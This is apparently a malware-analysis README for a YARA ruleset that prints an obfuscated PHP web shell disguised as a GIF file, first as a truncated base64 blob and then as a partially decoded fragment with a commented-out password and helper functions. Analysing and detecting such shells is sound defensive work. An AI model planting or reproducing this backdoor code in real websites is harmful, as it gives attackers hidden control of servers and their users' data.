# WebShell-GIF.Backdoor.GEN
Obfuscated WebShell/GIF.Backdoor.GEN | Yara Ruleset

This piece of Malware object's script was extracted from NX FireEye | MVX Engine 

```
GIF89a<title>GIF89a</title>
 <?php 
$dos="DQoNCi8vJHBhc3N3b3JkID0gImh1b3NoYW4iOy8vyejWw8PcwusNCi8vLS0tLS0tLS0tLS0tLS
0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS
0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTIwMTMtMDYtMTW4/NDCDQoNCj8+IDw/cGhwDQovLy0tLS
0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS
0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0yMDEzLTA2LTE1uPzQwg0KZXJyb3Jfcm
Vwb3J0aW5nKEVfRVJST1IpOw0KaGVhZGVyKCJjb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD
1nYjIzMTIiKTsNCnNldF90aW1lX2xpbWl0KDApOw0KDQpmdW5jdGlvbiBSb290X0dQKCRhcnJheSkNCn
sNCgl3aGlsZShsaXN0KCRrZXksJHZhcikgPSBlYWNoKCRhcnJheSkpDQoJew0KCQlpZigoc3RydG91cH
Blcigka2V5KSAhPSAka2V5IHx8ICcnLmludHZhbCgka2V5KSA9PSAiJGtleSIpICYmICRrZXkgIT0gJ2
FyZ2MnICYmICRrZXkgIT0gJ2FyZ3YnKQ0KCQl7DQoJCQlpZihpc19zdHJpbmcoJHZhcikpICRhcnJheV
ska2V5XSA9IHN0cmlwc2xhc2hlcygkdmFyKTsNCgkJCWlmKGlzX2FycmF5KCR2YXIpKSAkYXJyYXlbJG
tleV0gPSBSb290X0dQKCR2YXIpOyAgDQoJCX0NCgl9DQoJcmV0dXJuICRhcnJheTsNCn0NCg0KZnVuY3
Rpb24gUm9vdF9DU1MoKQ0Kew0KcHJpbnQ8PDxFTkQNCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQoJKn
twYWRkaW5nOjA7IG1hcmdpbjowO30NCglib2R5e2JhY2tncm91bmQ6dGhyZWVkZmFjZTtmb250LWZhbW
lseToiVmVyZGFuYSIsICJUYWhvbWEiLCAiy87M5SIsc2Fucy1zZXJpZjsgZm9udC1zaXplOjEzcHg7bW
FyZ2luLXRvcDozcHg7bWFyZ2luLWJvdHRvbTozcHg7dGFibGUtbGF5b3V0OmZpeGVkO3dvcmQtYnJlYW
s6YnJlYWstYWxsO30NCglhe2NvbG9yOiMwMDAwMDA7dGV4dC1kZWNvcmF0aW9uOm5vbmU7fQ0KCWE6aG
92ZXJ7YmFja2dyb3VuZDojQ

```

## After Decoding the $dos content, it seems like this;

```
//$password = "huoshan";//
//----------------------------------------------------------------------------------------------------2013-06-15

?> <?php
//----------------------------------------------------------------------------------------------------2013-06-15
error_reporting(E_ERROR);
header("content-Type: text/html; charset=gb2312");
set_time_limit(0);

function Root_GP($array)
{
	while(list($key,$var) = each($array))
	{
		if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv')
		{
			if(is_string($var)) $array[$key] = stripslashes($var);
			if(is_array($var)) $array[$key] = Root_GP($var);  
		}
	}
	return $array;
}

function Root_CSS()
{
print<<<END
<style type="text/css">
	*{padding:0; margin:0;}
	body{background:threedface;font-family:"Verdana", "Tahoma", "",sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
	a{color:#000000;text-decoration:none;}
	a:hover{background:#
```
